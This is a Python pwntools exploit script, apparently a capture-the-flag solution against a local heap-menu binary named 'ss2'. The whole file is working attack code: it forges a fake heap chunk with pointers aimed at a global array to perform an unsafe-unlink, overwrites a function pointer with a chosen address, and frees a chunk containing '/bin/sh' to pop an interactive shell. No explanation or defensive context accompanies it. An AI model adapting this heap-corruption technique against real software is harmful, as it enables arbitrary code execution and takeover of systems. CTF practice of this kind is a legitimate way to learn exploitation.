#!/usr/bin/env python
from pwn import *

context.log_level="debug"

p=process("./ss2")

def create(size,ctx):
	p.sendline("1")
	sleep(0.2)
	p.sendline(str(size))
	sleep(0.2)
	p.send(ctx)
	
def delete(index):
	p.sendline("2")
	sleep(0.2)
	p.sendline(str(index))
	
def edit(index,ctx,bss_ctx):
	p.sendline("3")
	sleep(0.2)
	p.sendline(str(index))
	sleep(0.2)
	p.send(ctx)
	sleep(0.2)
	p.send(bss_ctx)
	
gdb.attach(p)
create(0xf0,"asas\n") #0
create(0xf0,"asas\n") #1
create(0xf0,"asas\n") #2

create(0x100,"ccc\n") # 3
create(0x100,"ddd\n") # 4

create(0x100,"/bin/sh\x00\n") # 5

delete(3)
delete(4)

create(0xf8,p64(0)+p64(0x21)+p64(0x6020d8-0x18)+p64(0x6020d8-0x10)+p64(0x20)+"\n") # 3
create(0x100,p64(0x100)+p64(0x110)+"aaa\n") # 4

delete(4)
edit(3,"\x18\x20\x60\x00","asdas\n")
edit(0,"\x30\x07\x40\x00\x00\x00","asda\n")
delete(5)
p.interactive()
#create(0x100,p64(0)+p64(0x20)+p64(0x6020c0-0x18)+p64(0x6020c0-0x10)+p64(0x20)+p64(0x20)+"\n")




